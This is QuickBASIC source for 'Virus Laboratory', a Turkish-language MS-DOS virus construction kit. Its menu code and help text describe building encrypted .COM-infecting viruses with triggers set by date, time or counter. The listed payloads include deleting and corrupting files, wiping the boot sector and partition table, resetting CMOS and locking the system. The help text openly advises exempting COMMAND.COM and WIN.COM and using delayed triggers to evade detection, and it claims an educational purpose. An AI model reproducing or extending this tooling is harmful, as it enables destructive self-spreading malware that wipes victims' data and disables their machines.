'$INCLUDE: 'QB.BI'
DECLARE SUB LoadFont (CharSet$(), HowMany, Where)
DECLARE SUB TurkceFont ()
DECLARE SUB OrijinalFont ()
DECLARE SUB Bekle ()
DECLARE SUB Hiz ()
DECLARE SUB TextAl (Degisken$, Sat, Sut, Boy, TextRenk, ZeminRenk)
DECLARE SUB VirusHazirla ()
DECLARE SUB VirusIskelet (Kod)
DECLARE SUB VirusCom ()
DECLARE SUB JumpYaz (FuncCode)
DECLARE SUB RegisterSakla ()
DECLARE SUB RegisterYaz (ActionName$)
DECLARE SUB TarihYaz (ActionName$)
DECLARE SUB SaatYaz (ActionName$)
DECLARE SUB SayacYaz (ActionName$, FuncSayac)
DECLARE SUB FuncDosyaSil (IslemKodu)
DECLARE SUB FuncDosyaBoz (IslemKodu)
DECLARE SUB FuncZamanDegistir (IslemKodu)
DECLARE SUB FuncCmosReset (IslemKodu)
DECLARE SUB FuncBootSil (IslemKodu)
DECLARE SUB FuncBootDegistir (IslemKodu)
DECLARE SUB FuncPartSil (IslemKodu)
DECLARE SUB FuncKlavyeKilitle (IslemKodu)
DECLARE SUB FuncSistemKilitle (IslemKodu)
DECLARE SUB FuncColdReset (IslemKodu)
DECLARE SUB FuncEkranaYaz (IslemKodu)
DECLARE SUB FuncYaziciyaYaz (IslemKodu)
DECLARE SUB FuncKlavyeLedleri (IslemKodu)
DECLARE SUB FuncVideoModu (IslemKodu)
DECLARE SUB FuncHarddiskYaz (IslemKodu)
DECLARE SUB GununZamani (GunTarih$, GunSaat$)
DECLARE SUB Rapor (Ism, Kd)
DECLARE SUB ProgramSonu ()
DECLARE SUB TusYardim ()
DECLARE SUB HataRutin ()
DECLARE SUB ProgramHazirla ()
DECLARE SUB AnaMenu ()
DECLARE SUB Intro ()
DECLARE SUB Warning ()
DECLARE SUB EkranKartiTest ()

ON ERROR GOTO Hata

DIM SHARED Regs AS RegTypeX
DIM SHARED Yardim$(126), CharSet$(20), HowMany, Where, SysSpeed
DIM SHARED FuncName$(20), FuncDate$(20), FuncTime$(20)
DIM SHARED FuncCounter(20), FuncTick(20), FuncSign(20)
DIM SHARED VirusFile$, VirusFileCom$, VirusMsg$, VirusMsgPrint$
DIM SHARED PgUp$, PgDn$, Up$, Down$, RGT$, LFT$, Tab$, ESC$, Bs$, Enter$, F1$
DIM SHARED F10$, ActionCode, yazar$, Yil$, program$, F2$, F8$
DIM SHARED True, False, FonksiyonKontrol, AnaKoduYaz, DegiskenYaz
DIM SHARED HataDurumKodu, Str, Stn, satir, sutun, zemin, zeminArka, LogoColor

CALL ProgramHazirla

AnaMenu:
CALL AnaMenu

Tus:
k$ = INKEY$: IF k$ = "" THEN GOTO Tus

IF k$ = Tab$ AND Str < 20 AND FuncSign(Str - 4) <> 0 THEN
 LOCATE Str, Stn: COLOR 7, zemin: PRINT "["; : LOCATE Str, Stn + 2: PRINT "]"
 IF Stn < 50 THEN
GunAl:
  Stn = 50
  DegiskenText$ = LEFT$(FuncDate$(Str - 4), 2)
  CALL TextAl(DegiskenText$, Str, Stn, 2, 15, zemin)
  IF VAL(DegiskenText$) > 31 OR VAL(DegiskenText$) < 0 THEN SOUND 3500, .2: GOTO GunAl
  MID$(FuncDate$(Str - 4), 1, 2) = SPACE$(2)
  MID$(FuncDate$(Str - 4), 1, 2) = STRING$(2 - LEN(LTRIM$(RTRIM$(STR$(VAL(DegiskenText$))))), "0") + LTRIM$(RTRIM$(STR$(VAL(DegiskenText$))))
  LOCATE Str, Stn: PRINT SPACE$(2)
  LOCATE Str, Stn: PRINT MID$(FuncDate$(Str - 4), 1, 2)
 END IF
 IF Stn = 50 THEN
AyAl:
  Stn = 53
  DegiskenText$ = MID$(FuncDate$(Str - 4), 4, 2)
  CALL TextAl(DegiskenText$, Str, Stn, 2, 15, zemin)
  IF VAL(DegiskenText$) > 12 OR VAL(DegiskenText$) < 0 THEN SOUND 3500, .2: GOTO AyAl
  MID$(FuncDate$(Str - 4), 4, 2) = SPACE$(2)
  MID$(FuncDate$(Str - 4), 4, 2) = STRING$(2 - LEN(LTRIM$(RTRIM$(STR$(VAL(DegiskenText$))))), "0") + LTRIM$(RTRIM$(STR$(VAL(DegiskenText$))))
  LOCATE Str, Stn: PRINT SPACE$(2)
  LOCATE Str, Stn: PRINT MID$(FuncDate$(Str - 4), 4, 2)
 END IF
 IF Stn = 53 THEN
YilAl:
  Stn = 56
  DegiskenText$ = RIGHT$(FuncDate$(Str - 4), 4)
  CALL TextAl(DegiskenText$, Str, 56, 4, 15, zemin)
  IF VAL(DegiskenText$) < 0 THEN SOUND 3500, .2: GOTO YilAl
  MID$(FuncDate$(Str - 4), 7, 4) = SPACE$(4)
  MID$(FuncDate$(Str - 4), 7, 4) = STRING$(4 - LEN(LTRIM$(RTRIM$(STR$(VAL(DegiskenText$))))), "0") + LTRIM$(RTRIM$(STR$(VAL(DegiskenText$))))
  LOCATE Str, Stn: PRINT SPACE$(4)
  LOCATE Str, Stn: PRINT MID$(FuncDate$(Str - 4), 7, 4)
 END IF

 IF Stn = 56 THEN
SaatAl:
  Stn = 63
  DegiskenText$ = LEFT$(FuncTime$(Str - 4), 2)
  CALL TextAl(DegiskenText$, Str, Stn, 2, 15, zemin)
  IF VAL(DegiskenText$) > 23 OR VAL(DegiskenText$) < 0 THEN SOUND 3500, .2: GOTO SaatAl
  MID$(FuncTime$(Str - 4), 1, 2) = SPACE$(2)
  MID$(FuncTime$(Str - 4), 1, 2) = STRING$(2 - LEN(LTRIM$(RTRIM$(STR$(VAL(DegiskenText$))))), "0") + LTRIM$(RTRIM$(STR$(VAL(DegiskenText$))))
  LOCATE Str, Stn: PRINT SPACE$(2)
  LOCATE Str, Stn: PRINT MID$(FuncTime$(Str - 4), 1, 2)
 END IF
 IF Stn = 63 THEN
DakikaAl:
  Stn = 66
  DegiskenText$ = RIGHT$(FuncTime$(Str - 4), 2)
  CALL TextAl(DegiskenText$, Str, Stn, 2, 15, zemin)
  IF VAL(DegiskenText$) > 59 OR VAL(DegiskenText$) < 0 THEN SOUND 3500, .2: GOTO DakikaAl
  MID$(FuncTime$(Str - 4), 4, 2) = SPACE$(2)
  MID$(FuncTime$(Str - 4), 4, 2) = STRING$(2 - LEN(LTRIM$(RTRIM$(STR$(VAL(DegiskenText$))))), "0") + LTRIM$(RTRIM$(STR$(VAL(DegiskenText$))))
  LOCATE Str, Stn: PRINT SPACE$(2)
  LOCATE Str, Stn: PRINT MID$(FuncTime$(Str - 4), 4, 2)
 END IF

 IF Stn = 66 THEN
SayacAl:
  Stn = 71
  DegiskenText$ = LTRIM$(RTRIM$(STR$(FuncCounter(Str - 4))))
  CALL TextAl(DegiskenText$, Str, Stn, 4, 15, zemin)
  IF VAL(DegiskenText$) < 0 THEN SOUND 3500, .2: GOTO SayacAl
  FuncCounter(Str - 4) = 0
  FuncCounter(Str - 4) = VAL(DegiskenText$)
  LOCATE Str, Stn: PRINT SPACE$(4)
  LOCATE Str, Stn: PRINT STRING$(4 - LEN(LTRIM$(RTRIM$(STR$(FuncCounter(Str - 4))))), "0"); LTRIM$(RTRIM$(STR$(FuncCounter(Str - 4))))
 END IF

 IF Stn = 71 THEN
  Stn = 5
  LOCATE Str, Stn: COLOR 31, zemin: PRINT "["; : LOCATE Str, Stn + 2: PRINT "]"
 END IF
 GOTO Tus
END IF
  

IF k$ = Enter$ OR k$ = " " THEN
 IF Str <= 19 THEN
  IF (Str - 4) <= 2 AND Stn > 6 THEN SOUND 3500, .2: GOTO Tus
  FOR i = 6 TO 15 STEP 3
   LOCATE Str, i: PRINT " "
  NEXT
  IF FuncSign(Str - 4) = INT(Stn / 3) THEN
   FuncSign(Str - 4) = 0
   LOCATE Str, Stn + 1: PRINT " "
  ELSE
   FuncSign(Str - 4) = INT(Stn / 3)
   LOCATE Str, Stn + 1: COLOR 15, zemin: PRINT "˘"
  END IF
 END IF
 IF Str = 20 AND FuncSign(11) <> 0 THEN
VirusMsgAl:
  DegiskenText$ = VirusMsg$
  CALL TextAl(DegiskenText$, Str, 6, 69, 15, zemin)
   FOR i = 1 TO LEN(DegiskenText$)
    dText$ = MID$(DegiskenText$, i, 1)
    IF dText$ = CHR$(34) OR dText$ = CHR$(39) OR ASC(dText$) < 32 THEN SOUND 3500, .2: GOTO VirusMsgAl
   NEXT
  VirusMsg$ = DegiskenText$
 ELSE
  IF Str = 20 THEN SOUND 3500, .2
 END IF
 IF Str = 21 AND FuncSign(12) <> 0 THEN
VirusMsgPrintAl:
  DegiskenText$ = VirusMsgPrint$
  CALL TextAl(DegiskenText$, Str, 6, 69, 15, zemin)
   FOR i = 1 TO LEN(DegiskenText$)
    dText$ = MID$(DegiskenText$, i, 1)
    IF dText$ = CHR$(34) OR dText$ = CHR$(39) OR ASC(dText$) < 32 THEN SOUND 3500, .2: GOTO VirusMsgPrintAl
   NEXT
  VirusMsgPrint$ = DegiskenText$
 ELSE
  IF Str = 21 THEN SOUND 3500, .2
 END IF
 GOTO Tus
END IF

IF k$ = Up$ THEN
 IF Str = 5 AND Stn > 5 THEN
  LOCATE Str, Stn: COLOR 7, zemin: PRINT "["; : LOCATE Str, Stn + 2: PRINT "]"
  Stn = 5
  Str = 21
  LOCATE Str, Stn: COLOR 31, zemin: PRINT "["; : LOCATE Str, Stn + 70: PRINT "]"
  GOTO Tus
 END IF
 IF Str < 20 THEN
   LOCATE Str, Stn: COLOR 7, zemin: PRINT "["; : LOCATE Str, Stn + 2: PRINT "]"
 ELSE
   LOCATE Str, Stn: COLOR 7, zemin: PRINT "["; : LOCATE Str, Stn + 70: PRINT "]"
 END IF
 IF Str > 5 THEN
  Str = Str - 1
   IF Str < 20 THEN
    Stn = 5
    LOCATE Str, Stn: COLOR 31, zemin: PRINT "["; : LOCATE Str, Stn + 2: PRINT "]"
   ELSE
    LOCATE Str, Stn: COLOR 31, zemin: PRINT "["; : LOCATE Str, Stn + 70: PRINT "]"
   END IF
 ELSE
  Str = 21
  LOCATE Str, Stn: COLOR 31, zemin: PRINT "["; : LOCATE Str, Stn + 70: PRINT "]"
 END IF
 GOTO Tus
END IF

IF k$ = Down$ THEN
 IF Str = 19 AND Stn > 5 THEN
  LOCATE Str, Stn: COLOR 7, zemin: PRINT "["; : LOCATE Str, Stn + 2: PRINT "]"
  Stn = 5
  Str = 20
  LOCATE Str, Stn: COLOR 31, zemin: PRINT "["; : LOCATE Str, Stn + 70: PRINT "]"
  GOTO Tus
 END IF
 IF Str < 20 THEN
   LOCATE Str, Stn: COLOR 7, zemin: PRINT "["; : LOCATE Str, Stn + 2: PRINT "]"
 ELSE
   LOCATE Str, Stn: COLOR 7, zemin: PRINT "["; : LOCATE Str, Stn + 70: PRINT "]"
 END IF
 IF Str < 21 THEN
  Str = Str + 1
   IF Str < 20 THEN
    Stn = 5
    LOCATE Str, Stn: COLOR 31, zemin: PRINT "["; : LOCATE Str, Stn + 2: PRINT "]"
   ELSE
    LOCATE Str, Stn: COLOR 31, zemin: PRINT "["; : LOCATE Str, Stn + 70: PRINT "]"
   END IF
 ELSE
  Str = 5
  LOCATE Str, Stn: COLOR 31, zemin: PRINT "["; : LOCATE Str, Stn + 2: PRINT "]"
 END IF
 GOTO Tus
END IF

IF k$ = LFT$ THEN
 IF (Str >= 5) AND (Str <= 19) THEN
   LOCATE Str, Stn: COLOR 7, zemin: PRINT "["; : LOCATE Str, Stn + 2: PRINT "]"
  IF Stn >= 5 THEN
   Stn = Stn - 3
   IF (Str >= 5) AND (Str <= 6) THEN Stn = 5
   IF Stn < 5 THEN Stn = 14
    LOCATE Str, Stn: COLOR 31, zemin: PRINT "["; : LOCATE Str, Stn + 2: PRINT "]"
   END IF
 END IF
 GOTO Tus
END IF

IF k$ = RGT$ THEN
 IF (Str >= 5) AND (Str <= 19) THEN
   LOCATE Str, Stn: COLOR 7, zemin: PRINT "["; : LOCATE Str, Stn + 2: PRINT "]"
  IF Stn <= 17 THEN
   Stn = Stn + 3
   IF (Str >= 5) AND (Str <= 6) THEN Stn = 5
   IF Stn > 14 THEN Stn = 5
    LOCATE Str, Stn: COLOR 31, zemin: PRINT "["; : LOCATE Str, Stn + 2: PRINT "]"
   END IF
 END IF
 GOTO Tus
END IF

IF k$ = F1$ THEN GOTO OnlineYardim
IF k$ = F2$ THEN CALL TusYardim: GOTO Tus
IF k$ = F8$ THEN CALL VirusHazirla: GOTO Tus
IF k$ = F10$ THEN CALL VirusCom: GOTO Tus
IF k$ = CHR$(27) THEN CALL ProgramSonu: END
LOCATE satir + 16, sutun + 32: SOUND 3500, .2
GOTO Tus


'Online yardçm...............................................................

OnlineYardim:
PCOPY 0, 1
satir = 3: sutun = 3: sira = 1
COLOR 15, zemin

LOCATE 1, 1: PRINT STRING$(80, " ")
COLOR 15, zemin: LOCATE 1, 32: PRINT program$
COLOR 11, zemin: LOCATE 1, 2: PRINT "VirÅs öretim Yazçlçmç"
LOCATE 1, 72: PRINT Yil$
LOCATE 1, 56: PRINT yazar$
COLOR LogoColor, zemin: LOCATE 1, 77: PRINT CHR$(250); CHR$(251); CHR$(252)
COLOR LogoColor, zeminArka: LOCATE 2, 77: PRINT CHR$(253); CHR$(254); CHR$(255)

COLOR 15, zemin
LOCATE satir, sutun: PRINT "…ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ YARDIM ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕª"
FOR i = satir + 1 TO satir + 18: COLOR 15, zemin: LOCATE i, sutun: PRINT "∫"; : COLOR 3, zemin: PRINT STRING$(73, " "); : COLOR 15, zemin: PRINT "∫"; : COLOR 0, 0: PRINT "€€"
NEXT i
LOCATE satir + 19, sutun: COLOR 15, zemin: PRINT "»ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº"; : COLOR 0, 0: PRINT "€€"
COLOR 0, 0: LOCATE satir + 20, sutun + 2: PRINT STRING$(75, "€")

Up$ = CHR$(0) + CHR$(72)
Down$ = CHR$(0) + CHR$(80)
PageUp$ = CHR$(0) + CHR$(73)
PageDown$ = CHR$(0) + CHR$(81)
HOME$ = CHR$(0) + CHR$(71)
END$ = CHR$(0) + CHR$(79)

GOTO YardimGoster

YardimTus:
k$ = INKEY$
IF k$ = "" THEN GOTO YardimTus
IF k$ = ESC$ THEN
 PCOPY 1, 0
 GOTO Tus
END IF

IF k$ = Up$ AND sira > 1 THEN sira = sira - 1
IF k$ = Down$ AND sira <= 108 THEN sira = sira + 1
IF k$ = PageDown$ THEN
 sira = sira + 18
 IF sira > 108 THEN sira = 109
END IF
IF k$ = PageUp$ THEN
 sira = sira - 18
 IF sira < 1 THEN sira = 1
END IF
IF k$ = HOME$ THEN sira = 1
IF k$ = END$ THEN sira = 109

YardimGoster:
COLOR 11, zemin
LOCATE satir + 1, sutun + 2: PRINT Yardim$(sira)
LOCATE satir + 2, sutun + 2: PRINT Yardim$(sira + 1)
LOCATE satir + 3, sutun + 2: PRINT Yardim$(sira + 2)
LOCATE satir + 4, sutun + 2: PRINT Yardim$(sira + 3)
LOCATE satir + 5, sutun + 2: PRINT Yardim$(sira + 4)
LOCATE satir + 6, sutun + 2: PRINT Yardim$(sira + 5)
LOCATE satir + 7, sutun + 2: PRINT Yardim$(sira + 6)
LOCATE satir + 8, sutun + 2: PRINT Yardim$(sira + 7)
LOCATE satir + 9, sutun + 2: PRINT Yardim$(sira + 8)
LOCATE satir + 10, sutun + 2: PRINT Yardim$(sira + 9)
LOCATE satir + 11, sutun + 2: PRINT Yardim$(sira + 10)
LOCATE satir + 12, sutun + 2: PRINT Yardim$(sira + 11)
LOCATE satir + 13, sutun + 2: PRINT Yardim$(sira + 12)
LOCATE satir + 14, sutun + 2: PRINT Yardim$(sira + 13)
LOCATE satir + 15, sutun + 2: PRINT Yardim$(sira + 14)
LOCATE satir + 16, sutun + 2: PRINT Yardim$(sira + 15)
LOCATE satir + 17, sutun + 2: PRINT Yardim$(sira + 16)
LOCATE satir + 18, sutun + 2: PRINT Yardim$(sira + 17)

GOTO YardimTus

'Functions...................................................................
DATA "Dosya Sil","00/00/0000","00:00",0000,0
DATA "Dosya Boz","00/00/0000","00:00",0000,0
DATA "Tarih & Saati Deßiütir","00/00/0000","00:00",0000,0
DATA "Boot Sil","00/00/0000","00:00",0000,0
DATA "Boot Deßiütir","00/00/0000","00:00",0000,0
DATA "Part Sil","00/00/0000","00:00",0000,0
DATA "CMOS Reset","00/00/0000","00:00",0000,0
DATA "Klavyeyi Kilitle","00/00/0000","00:00",0000,0
DATA "Sistemi Kilitle","00/00/0000","00:00",0000,0
DATA "Cold Reset","00/00/0000","00:00",0000,0
DATA "Ekrana Mesaj Yaz","00/00/0000","00:00",0000,0
DATA "Yazçcçya Mesaj Yaz","00/00/0000","00:00",0000,0
DATA "Klavye Ledlerini Boz","00/00/0000","00:00",0000,0
DATA "Video Modunu Deßiütir","00/00/0000","00:00",0000,0
DATA "Harddisk'e Yaz","00/00/0000","00:00",0000,0

'Yardçm tançmlamalarç........................................................
DATA "                 Bu program IBM ve uyumlusu bilgisayar sistemlerinde   "
DATA "MS-DOS iületim sistemi altçnda áalçüabilecek bir bilgisayar virÅsÅ Åre-"
DATA "tebilmek amacçyla hazçrlanmçütçr. VirÅsÅn Åretilmesi , derlenmesi ve   "
DATA ".COM haline getirilmesi program tarafçndan , seáilen îzelliklere gîre  "
DATA "otomatik olarak yapçlmaktadçr.                                         "
DATA "ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ"
DATA "                 VL (Virus Laboratory) tarafçndan Åretilen virÅsler üu "
DATA " aüamalardan geáer;                                                    "
DATA "                                                                       "
DATA " 1) VirÅs , seáilen îzelliklere gîre hazçrlançr ve .ASM dosyasç olarak "
DATA "    diske yazçlçr.                                                     "
DATA " 2) Bu dosya TURBO ASSEMBLER programç tarafçnda .OBJ hale dînÅütÅrÅlÅr."
DATA " 3) .OBJ dosyasç TURBO LINK programç tarafçndan .COM hale getirilir ,  "
DATA "    bîylece virÅsÅn Åretilme prosedÅrleri tamamlanmçü olur.            "
DATA "ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ"
DATA "                 Yukarçda sçralanan aüamalardan da anlaüçlacaßç Åzere  "
DATA "virÅsÅn Åretilebilmesi iáin TURBO ASSEMBLER ve TURBO LINK programlarçna"
DATA "ihtiyaá vardçr , áÅnkÅ tÅm testler ve Åretilen Assembly kodu bu prog - "
DATA "ramlar baz alçnarak hazçrlanmçütçr. Testler sçrasçnda adç geáen her iki"
DATA "programçnda 2.0 versiyonlarç kullançlmçütçr. Dißer derleyiciler denen -"
DATA "memiütir.                                                              "
DATA "ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ"
DATA "                 Program TÅrkáe font desteßini gîrÅldÅßÅ Åzere kendisi "
DATA "saßlamaktadçr , bu sebeple en az VGA ekran kartç gerektirmektedir. Bu- "
DATA "uyarç, programç kullanmak isteyebilecek daha dÅüÅk konfigÅrasyonlu sis-"
DATA "temler iáindir.                                                        "
DATA "ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ"
DATA "                 VirÅs Åretim menÅsÅndeki TETòKLER baülçßç altçnda sç- "
DATA "ralanan kutularçn anlamlarç sçrasç ile üudur.                          "
DATA "                                                                       "
DATA "1.Kutu) Herhangi bir program áalçütçßç zaman virÅs tetiklensin.        "
DATA "2.Kutu) Herhangi bir iülem yapçldç zaman virÅs tetiklensin.            "
DATA "3.Kutu) Tarih okundußu zaman virÅs tetiklensin.                        "
DATA "4.Kutu) Saat okundußu zaman virÅs tetiklensin.                         "
DATA "                                                                       "
DATA "                 SAYAÄ kutusu ise virÅsÅn kaá kere tetiklendißi zaman  "
DATA "kendini gîstereceßini , TARòH ve SAAT kutularç ise virÅsÅn aktif olaca-"
DATA "ßç tarih ve saati belirtmektedir.                                      "
DATA "ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ"
DATA "                 Programçn bu versiyonu (1.50) tarafçndan Åretilebile- "
DATA "cek virÅsler sadece .COM dosyalarçna bulaüabilmekte ve dosya boyundaki "
DATA "artçü , virÅsÅn taüçdçßç îzelliklere gîre deßiümektedir. öretilebilecek"
DATA "virÅsler fazla geliükin olmamakla birlikte Encrypt îzellißi taüçmakta- "
DATA "tadçrlar. Programçn amacç , kullançcçnçn istekleri doßrultusundaki î - "
DATA "zellikleri taüçyan virÅsler Åretmektir. VirÅsÅn vereceßi zararçn boyu- "
DATA "tu tamamen kullançcçnçn arzusu doßrultusundadçr.                       "
DATA "                 VirÅs aktivitelerinde tarih/saat/sayaá olgusu kullanç-"
DATA "lçrsa virÅsÅn tespiti daha zor olacaktçr. ôlÅmcÅl darbelerde ise sÅre  "
DATA "fazla uzatçlmamalçdçr , aksi halde virÅs sÅrekli yayçldçßç iáin tespit "
DATA "edilip bertaraf edilebilir.                                            "
DATA "                 Bu program hazçrlançrken INTERNET Åzerindeki dißer vi-"
DATA "rÅs Åretim programlarç tarafçndan Åretilen virÅsler incelendi ve tama- "
DATA "men îzgÅn olan bu program yazçldç , ve Åretilen virÅslerin her yînden  "
DATA "onlardan daha geliükin olmasç saßlandç. öretilebilecek virÅslerin áeüit"
DATA "lilißi daha fazladçr ve sistem kilitlenmelerine sebep olma ihtimalleri "
DATA "daha dÅüÅktÅr.                                                         "
DATA "                 Daha încede belirtildißi Åzere Åretilecek virÅsler sa-"
DATA "dece .COM uzantçlç dosyalara bulaüabilmektedir , buna COMMAND.COM ile  "
DATA "WIN.COM dahil deßildir. Aksi halde sistem kilitlenmesi oluüabileceßin -"
DATA "den virÅsÅn farkedilmesi oldukáa kolaylaüacaktçr. Bu sebeple bu dosya -"
DATA "yalara bulaümamasç iáin iáerisinde kontrol yordamç iáermektedir. ônceki"
DATA "versiyonda (ilk versiyon) bu îzellik bulunmamaktadçr. Bu sonderece bÅ- "
DATA "yÅk sakçncalar doßurabileceßinden derhal bu îzellik eklenmiütir.       "
DATA "ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ"
DATA "                     VL virÅslerinin ortak îzellikleri                 "
DATA "                                                                       "
DATA "1) Encrypt îzellißi taüçmaktadçrlar (Bulaütçklarç dosyada tespit edile-"
DATA "   bilseler dahi , analiz edilmeleri zordur).                         "
DATA "2) WIN.COM ve COMMAND.COM'a bulaümazlar (Tespiti zorlaütçrmak iáin).   "
DATA "3) Sadece .COM dosyalarçna bulaüçrlar (Dosyançn .EXE olup olmadçßçnç u-"
DATA "   zantçsçna bakmaksçzçn kontrol ederler).                             "
DATA "4) Dosyançn nitelißi (Salt okunur vs. gibi) bulaümalarçnç engelleyemez."
DATA "5) Dosyançn tarih ve zamançnç deßiütirmezler.                          "
DATA "6) Bir dosyaya iki kere bulaümazlar.                                   "
DATA "7) MS-DOS iületim sisteminde áalçüabilirler sadece.                    "
DATA "ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ"
DATA "                 VIRUS LABORATORY'nin Åretiliü amacç kesinlikle muzçr  "
DATA "yazçlçmç teüvik deßildir. Sadece virÅslerin ne oldußu ve neler yapabi- "
DATA "leceßi konusunda fikir vermektir. Ayrçca bu virÅsler Windows 95/NT al- "
DATA "tçnda iüleyiülerine devam edememekle beraber , tespit edilmelerinin da-"
DATA "ha kolay oldußunu belirtmek isterim.                                   "
DATA "ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ"
DATA "                 VL yazçlçrken sadece .ASM uzantçlç dosya Åretmekte fa-"
DATA "kat bunlarç derlememekteydi,áÅnkÅ derleyebilmesi iáin DOS aracçlçßçyla "
DATA "înce TASM.EXE'yi sonrada TLINK.EXE'yi áaßçrmasç gerekiyordu.Bir progra-"
DATA "mçn iáerisinden baüka bir programçn áaßçrçlmasç pek uygun bir durum ol-"
DATA "madçßç gibi tam olarak hatalarçn kontrolÅne de imkan tançmamaktadçr.Bu-"
DATA "na raßmen kullançcçnçn programdan áçkmadan virÅsÅ derleyebilmesi amacç "
DATA "ile programa TASM.EXE ve TLINK.EXE aracçlçßç ile virÅsÅn derlenebilmesi"
DATA "îzellißi eklenmiütir.Otomatik derleme iülemi sçrasçnda oluüabilecek ha-"
DATA "talara karüç kullançcç aüaßçda gîsterildißi üekilde VIRUS.ASM dosyasçnç"
DATA "kendiside derleyebilir.                                                "
DATA "                                                                       "
DATA "1) VIRUS.ASM dosyasçnçn VIRUS.OBJ dosyasçna dînÅütÅrÅlmesi:            "
DATA "                                                                       "
DATA "     TASM.EXE VIRUS.ASM  (Burada uzantç yazmaya gerek yoktur.)         "
DATA "                                                                       "
DATA "2) VIRUS.OBJ dosyasçnçn VIRUS.COM dosyasçna dînÅütÅrÅlmesi:            "
DATA "                                                                       "
DATA "     TLINK.EXE /T VIRUS.OBJ                                            "
DATA "ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ"
DATA "                 VL tarafçndan Åretilebilecek virusler MS-DOS altçnda  "
DATA "áalçüabilecek üekilde tasarlanmçü ve bu iületim sisteminde test edil-  "
DATA "miülerdir. Bunun dçüçndaki (Windows 3.1/95/98/NT , OS/2..) sistemlerle "
DATA "uyumluluklarç denenmemiü ve adç geáen sistemlere uyarlanmamçülardçr.   "
DATA "Bu sebeple bu sistemlerdeki reaksiyonlarçnçn ne olacaßç bilinmemekte-  "
DATA "dir.                                                                   "
DATA "                 Programçn eßitim amaálç oldußu akçldan áçkarçlmamalç- "
DATA "dçr , bu yÅzden Åretilebilecek viruslerin her sistem'e uyumluluklarç   "
DATA "denenmemiütir. Ancak virus olgusunun ne oldußunun tam olarak kavrana - "
DATA "bilmesi iáin programçn bu hali ile Åretebileceßi virusler'de oldukáa ye"
DATA "terlidir.                                                              "
DATA "ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ"
DATA "ûu klasik sîzlerle aáçklamamç bitirmek istiyorum;                      "
DATA "                                                                       "
DATA "     VIRUS LABORATORY yazçlçrken her aüamada test edildi ve hatalarç a-"
DATA "yçklandç.TÅm ihtimaller gîz înÅnde bulundurulmaya áalçüçldç. TÅm bu i- "
DATA "tinaya raßmen oluüabilecek herhangi bir zarardan programçn yazarç so - "
DATA "rumlu tutulamaz.                                                       "
DATA "                                                                       "
DATA "               Bu programç kullanmakla yukarçdaki üartç otomatik olarak"
DATA "kabul etmiü olmaktasçnçz.                                              "
DATA "ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ"
DATA "                                                                       "
DATA "                                                                       "
DATA "                         - Yardçm BîlÅmÅ Sonu -                        "

'Turkáe Fontlar..............................................................
DATA 0 , 0 , 0 , 0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,30,32,60,48,30,0,120,127,0,0,0,0,0
DATA 0,0,0,16,16,16,28,12,0,120,127,0,0,0,0,0
DATA 0,0,0,0,102,255,255,126,60,24,0,0,0,0,0,0
DATA 0,0,0,24,60,126,255,126,60,24,0,0,0,0,0,0
DATA 0,0,24,60,60,90,255,255,102,24,60,0,0,0,0,0
